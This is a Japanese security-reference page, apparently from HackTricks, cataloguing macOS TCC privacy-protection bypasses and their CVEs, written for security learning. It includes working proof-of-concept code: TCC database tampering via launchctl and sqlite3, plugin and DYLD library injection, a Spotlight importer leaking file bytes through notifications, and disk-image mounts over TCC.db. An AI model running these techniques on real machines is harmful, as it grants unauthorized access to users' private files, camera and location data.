# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

TCC grant の保存先と、Automation の送信元／ターゲットの帰属については、[macOS TCC overview](../index.html#identify-apple-events-sender-and-target-grants) を参照してください。

## 機能別

### 書き込みバイパス

これはバイパスではなく、TCC の仕組みそのものです。**書き込みは保護されません**。Terminal にユーザーの Desktop の読み取り権限が**なくても、そこに書き込むことはできます**。

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**拡張属性 `com.apple.macl`**は、新しい**ファイル**に追加され、**作成元アプリ**にそのファイルの読み取りアクセスを許可します。<sup>[[2]](#references)</sup>

### TCC ClickJacking

**TCCプロンプトの上にウィンドウを重ねる**ことで、ユーザーに気付かれずに**承認**させることができます。PoCは[**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**で確認できます。**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### 任意の名前によるTCCリクエスト

攻撃者は、**`Info.plist`**で任意の名前（例：Finder、Google Chromeなど）の**アプリを作成**し、TCCで保護された場所へのアクセスを要求させることができます。ユーザーは、正規のアプリがアクセスを要求していると思い込むでしょう。\
さらに、**Dockから正規のアプリを取り除いて偽物を置く**こともできます。ユーザーが偽物（同じアイコンも使用可能）をクリックすると、正規のアプリを呼び出してTCCのアクセス許可を要求し、マルウェアを実行できます。これにより、ユーザーは正規のアプリがアクセスを要求したと思い込む可能性があります。<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

詳細とPoCはこちら:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

デフォルトでは、**SSH経由のアクセスには「Full Disk Access」が付与されていました**。これを無効にするには、リストに表示したまま無効にする必要があります（リストから削除しても、これらの権限は取り消されません）。<sup>[[2]](#references)</sup>

![TCCの任意の名前によるリクエスト - SSH Bypass: デフォルトでは、SSH経由のアクセスには「Full Disk Access」が付与されていました。これを無効にするには、リストに表示したまま無効にする必要があります（リストから削除しても...](<../../../../../images/image (1077).png>)

一部の**マルウェアがこの保護を回避した事例**はこちらで確認できます:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 現在、SSHを有効にするには**Full Disk Access**が必要です

### 拡張子の処理 - CVE-2022-26767

**`com.apple.macl`**属性は、**特定のアプリケーションにファイルの読み取り権限を付与するため**にファイルに設定されます。この属性は、ファイルをアプリに**ドラッグ＆ドロップ**したとき、またはユーザーがファイルを**ダブルクリック**して**デフォルトのアプリケーション**で開いたときに設定されます。

そのため、ユーザーが悪意のあるアプリを登録してすべての拡張子を処理させ、Launch Servicesを呼び出して任意のファイルを**開く**ことができます（これにより、悪意のあるファイルに読み取りアクセスが許可されます）。<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlementを使うと、**`com.apple.iCloudHelper`** XPC serviceと通信し、**iCloud tokens**を取得できます。

**iMovie**と**Garageband**には、このentitlementと、これを可能にするその他のentitlementがありました。

このentitlementを利用して**iCloud tokensを取得する**exploitの詳細については、こちらのトークをご覧ください: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Darwin notification names経由のSpotlight importer leakage

Spotlight importerは、通常のプロセスがFull Disk Accessなしでは読み取れないファイルでも、Spotlightが`GetMetadataForFile` callbackに渡すファイルを読み取ることができます。[TCCで認可されたプロセスへのcode injection](../macos-tcc-credential-and-data-theft.md)とは異なり、この手法には、importerをインストールできるローカル footholdと、対応するSpotlight indexing eventが必要です。importerはsandbox内で実行されますが、名前だけのDarwin notificationsを使って、そのsandbox外のlistenerにbytesを送信できます。これはdata-leak channelであり、root権限の取得や、importerからの任意のファイルアクセスにつながるものではありません。<sup>[[24]](#references)</sup>

importerの`Info.plist`にある`CFBundleDocumentTypes` → `LSItemContentTypes`で対象ファイルのtypeを宣言し、bundleを`~/Library/Spotlight/`またはアプリの`Contents/Library/Spotlight/`にインストールします。`mdimport -L`で登録を確認します。[Spotlight importer section](../../../../macos-auto-start-locations.md#spotlight-plugins)では、bundleの配置とファイルtypeの照合について説明しています。importerが受け取るのは、Spotlightがそのimporterを選択したファイルだけです。通常は既存のimporterが優先されます。macOS 26 Tahoeでは、報告されたテストで`mdimport -i`による即時の再帰的indexingは安定して強制できませんでした。一方、`mdimport -r ~/Library/Spotlight/Spotlight.mdimporter`は、そのimporterが処理対象とするUTIの再importを要求しました。<sup>[[24]](#references)</sup>

channelをテストするには、sandbox外で`notifyutil -w TEST_TEST_TEST`を使ってlistenerを起動し、`CFNotificationCenterGetDarwinNotifyCenter()`と`NULL`のobjectおよび`userInfo`を指定してnotificationを送信します。`userInfo` payloadを持つdistributed notificationとは異なり、Darwin notificationが持つのは名前だけです。binary dataを送るには、`notify_register_dispatch`を使って、外部listenerに10進数の名前`0`から`255`を登録し、各callbackのregistrationを対応するbyte値に割り当てます。`GetMetadataForFile`内では、Spotlightから渡された`pathToFile`だけを読み取り、各byteを10進数のnotification nameとして送信します:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

リスナーはTCCで保護されたファイル自体を読み取るのではなく、バイト列を再構築します。公開されたPoCでは、SIPが有効なmacOS 26上のFDA権限を持たないターミナルから、`knowledgeC.db`の先頭64バイトを復元しました。これは帯域幅が小さく、大量コピーの方法としては信頼性に欠けます。Spotlightが対象ファイルをインデックス化または再インデックス化しない場合があり、Importerのインスタンスが同時に動作すると、通知ストリームが入り混じる可能性があります。ほかのサンドボックス境界のメカニズムについては、[macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/)を参照してください。<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`**権限を持つアプリは、**ほかのアプリを制御**できます。つまり、**ほかのアプリに付与された権限を悪用**できる可能性があります。<sup>[[2]](#references)</sup>

Apple Scriptsの詳細については、以下を確認してください。


{{#ref}}
macos-apple-scripts.md
{{#endref}}

たとえば、アプリが**`iTerm`に対するAutomation権限**を持っている場合、次の例のように、**`Terminal`がiTermへのアクセス権を持つ**ことになります。

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm経由

FDA権限を持たないTerminalは、権限を持つiTermを呼び出し、操作を実行させることができます。

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Finder経由で

または、AppがFinder経由でアクセスできる場合、次のようなスクリプトを実行できます。

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Appごとの動作

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの **tccd daemon** は、TCCユーザーデータベースにアクセスするために **`HOME`** **env** 変数を使用していました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[こちらのStack Exchangeの投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)によると、TCC daemonは現在のユーザーのドメイン内で `launchd` 経由で実行されているため、daemonに渡される**すべての環境変数を制御できます**。<sup>[[19]](#references)</sup>\
したがって、**攻撃者は `launchctl` で `$HOME` 環境**変数を**制御下の** **ディレクトリ**を指すように設定し、**TCC** daemonを**再起動**すれば、エンドユーザーに一度も確認を求めることなく、**TCCデータベースを直接変更**して、利用可能な**すべてのTCC entitlementを自身に付与できます**。<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes は TCC で保護された場所にアクセスできましたが、新しく作成されたノートは**保護されていない場所に保存**されていました。そのため、攻撃者は Notes に保護されたファイルをノートへコピーさせ、その後、保護されていない場所からコピーされたデータにアクセスできました。

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

ライブラリ `libsecurity_translocate` を使用するバイナリ `/usr/libexec/lsd` には、**nullfs** マウントを作成できる entitlement `com.apple.private.nullfs_allow` と、すべてのファイルにアクセスできる **`kTCCServiceSystemPolicyAllFiles`** を指定した entitlement `com.apple.private.tcc.allow` がありました。

「Library」に quarantine 属性を追加し、**`com.apple.security.translocation`** XPC service を呼び出すと、Library は **`$TMPDIR/AppTranslocation/d/d/Library`** にマッピングされ、Library 内のすべての書類に**アクセス**できました。

### CVE-2024-44131 - FileProvider symlink race

ファイル操作を**特権ヘルパー**（ここでは **`fileproviderd`** / `Files.app`）に委譲するアプリは、**ユーザーに代わって**項目をコピーまたは移動するため、コピーは呼び出し元ではなくヘルパーの権限で実行されます。

Jamf Threat Labs は、操作前に行われる symlink の検証を**競合させられる**ことを示しました。検査されるパスの**最後の**構成要素に symlink を仕掛けるのではなく、コピーが始まった**後に**パスの**途中にある**ディレクトリを攻撃者が入れ替えます。すると、特権ヘルパーは攻撃者が制御するリンクをたどり、**一度もプロンプトを表示せずに** TCC で保護された場所を読み書きします。<sup>[[5]](#references)</sup>

パスにランダムな UUID が含まれていないディレクトリ（例：`~/Library/Mobile Documents/com~apple~CloudDocs`）は、攻撃者が競合させる完全なパスを予測できるため、特に狙いやすい対象です。

> [!TIP]
> 探すべき一般的なパターンは次のとおりです。パスを複数回解決する**あらゆる特権プロセス**（check-then-use、または `rename()` / `copyfile()` がソースと宛先を別々に解決するケース）は、パス途中のディレクトリを入れ替えることで競合させられます。`O_NOFOLLOW_ANY`、すでに開かれたディレクトリ FD に対する `openat()`、または `realpath()` と再検証だけが、この隙間を実際に塞ぎます。

詳しくは[**Jamf Threat Labs の writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)を参照してください。<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` は `SQLITE_ENABLE_SQLLOG` を有効にしてビルドできます。この設定により、環境変数で制御されるログ記録フックが追加されます（[upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）。<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **開かれるすべてのデータベース**について、**データベースファイルのコピー**と SQL 文のログが `path` に書き込まれます（このディレクトリはあらかじめ存在している必要があります）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB を開く／アタッチするたびに、既存のコピーを再利用せず**新しいコピーを作成**します。
- **`SQLITE_SQLLOG_CONDITIONAL`** – メイン DB の隣に `<database>-sqllog` ファイルがある場合にのみ、接続をログに記録します。

この変数を、**FDA** を持ち SQLite データベースを開くプロセスに注入できれば、保護されたデータベースを制御下のディレクトリへ**コピーさせる**ことができます。宛先のファイル名は攻撃者が制御できるデータから生成されるため、宛先に仕掛けた **symlink** によって、同じ仕組みを利用し、対象プロセスの権限で**任意のファイルを書き込む**こともできます。

### **SQLITE_AUTO_TRACE**

環境変数 **`SQLITE_AUTO_TRACE`** が設定されていると、ライブラリ **`libsqlite3.dylib`** はすべての SQL クエリの**ログ記録**を開始します。多くのアプリケーションがこのライブラリを使用していたため、それらのアプリケーションの SQLite クエリをすべて記録できました。<sup>[[22]](#references)</sup>

Apple の複数のアプリケーションが、このライブラリを使って TCC で保護された情報にアクセスしていました。

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### env-var によって駆動されるファイル書き込みを探す

前述の2つは同じ汎用的な手法の例です。他にもないか探してみる価値があります。**TCC 権限を持つアプリに読み込まれる framework は、呼び出し元が制御するパスにプロセスがファイルを作成する、デバッグ／ログ用環境変数を公開していることがよくあります**。

探す手順:

1. FDA や他の価値の高い TCC 権限を持つターゲット（`Music`、`TV`、`Terminal`、MDM エージェントなど）を選び、リンクしている framework を一覧表示します（`otool -L`、`vmmap`）。
2. framework 内から `getenv` 文字列を grep します: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. `launchctl setenv NAME /path/you/control` で候補の環境変数を設定し、アプリを起動して、`fs_usage -w -f filesys <pid>` または `sudo fs_usage | grep <path>` でファイルシステム上の動作を監視します。
4. プロセスがディレクトリ内にファイルを**作成または名前変更**するなら、書き込みプリミティブを得たことになります。宛先を symlink に向けるか、（上記の CVE-2024-44131 のように）中間ディレクトリを race させ、`~/Library/Application Support/com.apple.TCC/TCC.db` に書き込みをリダイレクトします。

> [!TIP]
> これには2つの制限があります。まず、アプリに [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（「dynamic linker の環境変数によってアプリが影響を受ける可能性があるかを示す Boolean 値。これを使用して、アプリのプロセスにコードを注入できる」）が付与されていない限り、**`DYLD_*` 変数は hardened-runtime バイナリでは無視されます**。詳しくは [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) も参照してください。次に、Apple は報告された framework のデバッグ変数を個別に削除するため、ある macOS リリースで動作した変数が次のリリースでは使えなくなっていることがよくあります。変数を設定した後にアプリが何も表示せず起動を拒否する場合、その変数はすでにフィルタリングされているものとして扱ってください。<sup>[[7]](#references)[[8]](#references)</sup>

linker 変数を使った同様の手法については、[macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) を参照してください。

### Apple Remote Desktop

root としてこのサービスを有効にすると、**ARD agent はフルディスクアクセスを持つ**ため、ユーザーがこれを悪用して新しい **TCC user database** をコピーさせることができます。

## **NFSHomeDirectory** による方法

TCC は、ユーザー固有のリソースへのアクセスを制御するため、ユーザーの HOME フォルダー内のデータベース **$HOME/Library/Application Support/com.apple.TCC/TCC.db** を使用します。\
したがって、ユーザーが TCC を再起動させる際に、$HOME env variable が**別のフォルダー**を指すようにできれば、**/Library/Application Support/com.apple.TCC/TCC.db** に新しい TCC database を作成し、TCC をだまして任意のアプリに任意の TCC permission を付与させることができます。

> [!TIP]
> Apple は、ユーザーの profile に保存されている **`NFSHomeDirectory`** attribute の値を **`$HOME` の値**として使用しています。そのため、この値を変更する権限（**`kTCCServiceSystemPolicySysAdminFiles`**）を持つアプリを侵害できれば、この方法を TCC bypass に**武器化**できます。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初の POC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使って、ユーザーの **HOME** フォルダーを変更します。

1. ターゲットアプリの _csreq_ blob を取得します。
2. 必要なアクセス権と _csreq_ blob を含む偽の _TCC.db_ ファイルを配置します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) を使って、ユーザーの Directory Services エントリーをエクスポートします。
4. Directory Services エントリーを変更して、ユーザーの home directory を変更します。
5. 変更した Directory Services エントリーを [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) でインポートします。
6. ユーザーの _tccd_ を停止し、プロセスを再起動します。

2つ目の POC では、`com.apple.private.tcc.allow` に `kTCCServiceSystemPolicySysAdminFiles` の値が設定された **`/usr/libexec/configd`** を使用しました。\
**`configd`** は **`-t`** オプションを指定して実行でき、攻撃者は**読み込む custom Bundle を指定**できました。そのため、この exploit では、ユーザーの home directory を変更する **`dsexport`** と **`dsimport`** の手法を **`configd` code injection** に置き換えています。

詳しくは[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)を参照してください。<sup>[[11]](#references)</sup>

## process injection による方法

プロセス内にコードを注入し、その TCC 権限を悪用する手法はいくつかあります:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

また、TCC bypass で見つかる最も一般的な process injection は、**plugins (load library)** を利用する方法です。\
Plugins は通常、libraries や plist の形式をした追加コードで、**メインアプリケーションによって読み込まれ**、そのコンテキストで実行されます。したがって、メインアプリケーションが（付与された権限や entitlements を通じて）TCC で制限されたファイルにアクセスできる場合、**カスタムコードも同じアクセス権を持ちます**。

### CVE-2020-27937 - Directory Utility

アプリケーション `/System/Library/CoreServices/Applications/Directory Utility.app` には **`kTCCServiceSystemPolicySysAdminFiles`** entitlement があり、拡張子 **`.daplug`** の plugins を読み込みましたが、hardened runtime は**有効になっていませんでした**。

この CVE を武器化するには、**`NFSHomeDirectory`** を（前述の entitlement を悪用して）**変更**し、ユーザーの TCC database を乗っ取って TCC を bypass します。

詳しくは[**元のレポート**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)を参照してください。<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

バイナリ **`/usr/sbin/coreaudiod`** には `com.apple.security.cs.disable-library-validation` と `com.apple.private.tcc.manager` の entitlements がありました。前者は**コード注入を許可**し、後者は**TCC の管理**を可能にしていました。

このバイナリは、フォルダー `/Library/Audio/Plug-Ins/HAL` から**サードパーティ製 plugins** を読み込めました。そのため、次の POC で **plugin を読み込ませ、TCC permissions を悪用**できました:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

詳細については、[**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)を確認してください。<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O 経由でカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、`/Library/CoreMediaIO/Plug-Ins/DAL`（SIP の制限対象外）にあるこれらのプラグインを**プロセス内にロード**します。

一般的な **constructor** を含むライブラリをそこに置くだけで、**inject code** が可能です。

複数の Apple アプリケーションがこの脆弱性の影響を受けました。

### Firefox

Firefox アプリケーションには、`com.apple.security.cs.disable-library-validation` および `com.apple.security.cs.allow-dyld-environment-variables` の entitlements がありました。<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

この方法を簡単にexploitする方法の詳細については、[**元のレポートを確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[14]](#references)</sup>

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` には、entitlement **`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** が設定されていたため、プロセス内にコードをinjectし、TCCの権限を利用することが可能でした。

### CVE-2023-26818 - Telegram

Telegramにはentitlement **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** が設定されていたため、これを悪用して、カメラでの録画などの**権限にアクセスする**ことが可能でした。[**writeupでpayloadを確認できます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[15]](#references)</sup>

環境変数を使ってライブラリをロードするために、ライブラリをinjectする**カスタムplist**を作成し、**`launchctl`**を使って起動した点に注目してください。<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## openによる起動

sandbox内でも **`open`** を起動できます。

### Terminalスクリプト

技術者が使うコンピュータでは、Terminalに **Full Disk Access（FDA）** を付与することはかなり一般的です。また、Terminalを使って **`.terminal`** スクリプトを起動できます。

**`.terminal`** スクリプトはplistファイルで、次の例のように、実行するコマンドが **`CommandString`** キーに記述されています。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

アプリケーションは、/tmp などの場所にターミナルスクリプトを書き込み、次のようなコマンドで起動できます:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## マウントによる

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**すべてのユーザー**（権限のないユーザーも含む）は、Time Machine snapshotを作成してマウントし、そのsnapshot内の**すべてのファイルにアクセス**できます。\
必要な**唯一の権限**は、使用するアプリケーション（`Terminal`など）に**Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）が付与されていることです。これは管理者が付与する必要があります。<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

より詳しい説明は[**元のレポートを参照**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC fileへのマウント

TCC DBファイルが保護されていても、新しいTCC.dbファイルを**ディレクトリにマウントする**ことが可能でした。

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)で**full exploit**を確認してください。<sup>[[21]](#references)</sup>

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2)で説明されているように、このCVEは`diskarbitrationd`を悪用しました。<sup>[[16]](#references)</sup>

公開されている`DiskArbitration` frameworkの関数`DADiskMountWithArgumentsCommon`がセキュリティチェックを実行していました。しかし、`diskarbitrationd`を直接呼び出すことでこのチェックをバイパスし、パス内の`../`要素やシンボリックリンクを使用できます。

これにより、攻撃者は`diskarbitrationd`のentitlement `com.apple.private.security.storage-exempt.heritable`を利用して、TCC databaseを含む任意の場所に任意のマウントを実行できました。

### asr

**`/usr/sbin/asr`**ツールを使うと、ディスク全体をコピーして別の場所にマウントし、TCC保護をバイパスできました。

### CVE-2022-22655 - Location Services

Location Servicesは、他のサービスのようにTCC databaseには保存されません。`locationd`が管理しており、独自の許可リストを**`/var/db/locationd/clients.plist`**に保持しています。<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

各エントリはクライアント（bundle ID または実行ファイルのパス）をキーとし、`Authorized`、`BundleId`、`Executable`、`Registered` などのフィールドを持ちます。<sup>[[4]](#references)</sup>

`clients.plist` ファイル自体はSandbox/TCCによって保護されており、rootであっても編集できません。しかし、**`/var/db/locationd/` ディレクトリはmountから保護されていませんでした**。そのため、root権限で実行する攻撃者は、独自の `clients.plist`（自身のバイナリを `Authorized` に設定したもの）を含むディスクイメージを作成し、それをディレクトリにmountしてから `locationd` を再起動すれば、偽造した許可リストを有効にできました。<sup>[[3]](#references)</sup>

> [!TIP]
> これは上記の `hdiutil`/`mount` TCC bypassと同じパターンです。*ファイル*は保護されていますが、そのファイルが置かれている*ディレクトリ*は保護されていないため、ファイルではなくディレクトリ全体を置き換えます。

## スタートアップアプリ経由


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep経由

ファイルがメールアドレス、電話番号、メッセージなどの機密情報を保護されていない場所に保存しているケースがいくつかあります（Appleではこれを脆弱性とみなします）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

これは現在では機能しませんが、[**過去には機能していました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)を使う別の方法:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

